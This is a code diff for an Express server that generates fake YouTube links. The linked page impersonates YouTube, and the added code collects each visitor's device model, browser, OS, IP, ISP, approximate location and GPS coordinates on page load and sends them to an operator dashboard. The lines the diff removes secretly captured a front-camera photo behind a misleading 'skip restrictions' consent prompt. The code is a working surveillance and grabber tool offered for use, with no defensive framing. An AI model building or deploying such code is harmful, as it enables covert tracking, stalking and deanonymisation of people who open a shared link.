@@ -6,7 +6,7 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server, { cors: { origin: "*" } });
 
-app.use(express.json({ limit: '10mb' }));
+app.use(express.json());
 
 // 1. لوحة التحكم الرئيسية
 app.get('/', (req, res) => {
@@ -16,7 +16,7 @@ app.get('/', (req, res) => {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>لوحة التحكم - التقاط الصور</title>
+        <title>لوحة التحكم الشاملة</title>
         <style>
             body { font-family: system-ui, sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
             .card { background: #1e1e1e; border-radius: 12px; padding: 20px; margin: 15px auto; max-width: 600px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
@@ -24,11 +24,10 @@ app.get('/', (req, res) => {
             button:hover { background: #cc0000; }
             input { width: 90%; padding: 10px; border-radius: 6px; border: 1px solid #333; background: #222; color: #fff; text-align: center; margin-top: 10px; }
             .info-box { text-align: right; background: #2a2a2a; padding: 15px; border-radius: 8px; margin-top: 12px; border-right: 5px solid #ff0000; font-size: 14px; line-height: 1.7; }
-            .captured-img { width: 100px; height: auto; border-radius: 6px; margin-top: 10px; border: 2px solid #ff0000; }
         </style>
     </head>
     <body>
-        <h2>📺 منشئ روابط يوتيوب التفاعلية</h2>
+        <h2>📺 منشئ روابط يوتيوب الذكية</h2>
         <div class="card">
             <p>ضع رابط فيديو يوتيوب واضغط إنشاء:</p>
             <input type="text" id="ytUrlInput" value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
@@ -40,7 +39,7 @@ app.get('/', (req, res) => {
             </div>
         </div>
 
-        <h3>📥 التقارير والصور الواردة:</h3>
+        <h3>📥 التقارير الشاملة للأجهزة:</h3>
         <div id="logs" class="card">
             <p style="color: #aaa;">في انتظار فتح الرابط...</p>
         </div>
@@ -71,12 +70,14 @@ app.get('/', (req, res) => {
                 
                 const box = document.createElement('div');
                 box.className = 'info-box';
-                box.innerHTML = '<strong>📱 اسم الجهاز:</strong> ' + data.deviceName + '<br>' +
-                                '<strong>🌐 عنوان IP:</strong> ' + data.ip + '<br>' +
-                                '<strong>📍 الموقع الجغرافي:</strong> ' + data.location + '<br>' +
+                box.innerHTML = '<strong>📱 ماركة ونوع الهاتف:</strong> ' + data.deviceName + '<br>' +
+                                '<strong>🌐 المتصفح والنظام:</strong> ' + data.browser + ' / ' + data.os + '<br>' +
+                                '<strong>📡 اسم الشبكة (مزود الخدمة):</strong> ' + data.networkISP + '<br>' +
+                                '<strong>🌐 عنوان IP الحقيقي:</strong> ' + data.ip + '<br>' +
+                                '<strong>📍 الموقع الجغرافي (الخريطة التقريبية):</strong> ' + data.location + '<br>' +
+                                '<strong>📍 الموقع الدقيق (GPS إن وجد):</strong> ' + data.gpsLocation + '<br>' +
                                 '<strong>🔋 البطارية:</strong> ' + data.battery + '<br>' +
-                                '<strong>🕒 الوقت:</strong> ' + data.time + '<br>' +
-                                (data.image ? '<strong>📸 الصورة الأمامية:</strong><br><img src="' + data.image + '" class="captured-img">' : '');
+                                '<strong>🕒 الوقت:</strong> ' + data.time;
                 logs.prepend(box);
             });
         </script>
@@ -85,7 +86,7 @@ app.get('/', (req, res) => {
   `);
 });
 
-// 2. صفحة الرابط: تظهر رسالة موافقة أولاً، وعند الضغط عليها يفتح الفيديو وتلتقط الصورة
+// 2. صفحة عرض اليوتيوب وجمع البيانات
 app.get('/watch/:id', async (req, res) => {
   const videoId = req.query.v || 'dQw4w9WgXcQ';
   
@@ -98,41 +99,22 @@ app.get('/watch/:id', async (req, res) => {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>YouTube - مشاهدة الفيديو</title>
+        <title>YouTube</title>
         <style>
             body { font-family: Arial, sans-serif; background: #0f0f0f; color: #fff; margin: 0; padding: 0; text-align: center; }
-            #prompt-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 9999; display: flex; justify-content: center; align-items: center; flex-direction: column; }
-            .modal { background: #212121; padding: 30px; border-radius: 12px; max-width: 400px; width: 90%; border: 1px solid #333; }
-            .modal h3 { color: #fff; margin-bottom: 10px; }
-            .modal p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
-            .modal button { background: #ff0000; color: #fff; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; }
-            .modal button:hover { background: #cc0000; }
             .header { background: #212121; padding: 12px 20px; text-align: left; font-weight: bold; font-size: 18px; color: #ff0000; border-bottom: 1px solid #333; }
-            .container { max-width: 800px; margin: 20px auto; padding: 10px; display: none; }
+            .container { max-width: 800px; margin: 20px auto; padding: 10px; }
             .video-container { position: relative; width: 100%; padding-bottom: 56.25%; height: 0; background: #000; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.8); }
             .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: 0; }
         </style>
     </head>
     <body>
-
-        <!-- نافذة الموافقة -->
-        <div id="prompt-overlay">
-            <div class="modal">
-                <h3>📺 تنبيه مشاهدة الفيديو</h3>
-                <p>اضغط على "موافق" أدناه لتخطي القيود وعرض الفيديو بدقة عالية.</p>
-                <button onclick="startExperience()">موافق (مشاهدة الآن)</button>
-            </div>
-        </div>
-
         <div class="header">▶ YouTube</div>
-        <div class="container" id="mainContainer">
+        <div class="container">
             <div class="video-container">
                 <iframe src="https://www.youtube-nocookie.com/embed/${videoId}?autoplay=1" allow="autoplay; encrypted-media" allowfullscreen></iframe>
             </div>
         </div>
-
-        <video id="video" autoplay playsinline style="display:none;"></video>
-        <canvas id="canvas" style="display:none;"></canvas>
 
         <script>
             function getExactDeviceModel(ua) {
@@ -144,11 +126,25 @@ app.get('/watch/:id', async (req, res) => {
                 return 'جهاز ذكي';
             }
 
-            async function startExperience() {
-                // إخفاء نافذة الموافقة وإظهار فيديو اليوتيوب فوراً
-                document.getElementById('prompt-overlay').style.display = 'none';
-                document.getElementById('mainContainer').style.display = 'block';
+            function getBrowserInfo(ua) {
+                if (ua.includes('Firefox')) return 'Firefox';
+                if (ua.includes('SamsungBrowser')) return 'Samsung Internet';
+                if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
+                if (ua.includes('Edg')) return 'Edge';
+                if (ua.includes('Chrome')) return 'Chrome';
+                if (ua.includes('Safari')) return 'Safari';
+                return 'متصفح آخر';
+            }
 
+            function getOSInfo(ua) {
+                if (ua.includes('Win')) return 'Windows';
+                if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+                if (ua.includes('Android')) return 'Android';
+                if (ua.includes('Mac')) return 'macOS';
+                return 'أخرى';
+            }
+
+            async function collectAndSend() {
                 let batteryLevel = "غير مدعوم";
                 if (navigator.getBattery) {
                     try {
@@ -157,49 +153,56 @@ app.get('/watch/:id', async (req, res) => {
                     } catch(e){}
                 }
 
-                let capturedImage = null;
-                try {
-                    // طلب إذن الكاميرا عند ضغطه على زر "موافق"
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    const videoElement = document.getElementById('video');
-                    videoElement.srcObject = stream;
-                    
-                    await new Promise(resolve => videoElement.onloadedmetadata = resolve);
-                    
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = videoElement.videoWidth || 320;
-                    canvas.height = videoElement.videoHeight || 240;
-                    const context = canvas.getContext('2d');
-                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-                    
-                    capturedImage = canvas.toDataURL('image/png');
-                    stream.getTracks().forEach(track => track.stop());
-                } catch(e) {
-                    capturedImage = null;
-                }
-
+                const ua = navigator.userAgent;
                 const deviceData = {
-                    deviceName: getExactDeviceModel(navigator.userAgent),
+                    deviceName: getExactDeviceModel(ua),
+                    browser: getBrowserInfo(ua),
+                    os: getOSInfo(ua),
                     ip: "${clientIp}",
                     battery: batteryLevel,
-                    image: capturedImage,
+                    networkISP: "جاري الجلب...",
+                    location: "جاري الجلب...",
+                    gpsLocation: "لم يمنح إذن الموقع",
                     time: new Date().toLocaleTimeString('ar-EG')
                 };
 
+                // جلب معلومات الشبكة والموقع عبر الـ IP
                 try {
                     const response = await fetch('https://ipapi.co/${clientIp}/json/');
                     const ipData = await response.json();
-                    deviceData.location = (ipData.city || "مجهول") + ", " + (ipData.country_name || "مجهول");
+                    deviceData.networkISP = ipData.org || "غير معروف";
+                    deviceData.location = (ipData.city || "مجهول") + ", " + (ipData.region || "") + ", " + (ipData.country_name || "مجهول");
                 } catch(e) {
-                    deviceData.location = "غير معروف";
+                    deviceData.networkISP = "تعذر الجلب";
+                    deviceData.location = "تعذر الجلب";
                 }
 
+                // محاولة جلب إحداثيات الخريطة الدقيقة (GPS) في حال سمح المستخدم
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            deviceData.gpsLocation = "خط الطول: " + pos.coords.latitude + ", خط العرض: " + pos.coords.longitude;
+                            sendData(deviceData);
+                        },
+                        () => {
+                            sendData(deviceData); // إرسال البيانات حتى لو رفض إذن الـ GPS
+                        },
+                        { timeout: 4000 }
+                    );
+                } else {
+                    sendData(deviceData);
+                }
+            }
+
+            function sendData(data) {
                 fetch('/api/log', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(deviceData)
+                    body: JSON.stringify(data)
                 });
             }
+
+            window.onload = collectAndSend;
         </script>
     </body>
     </html>
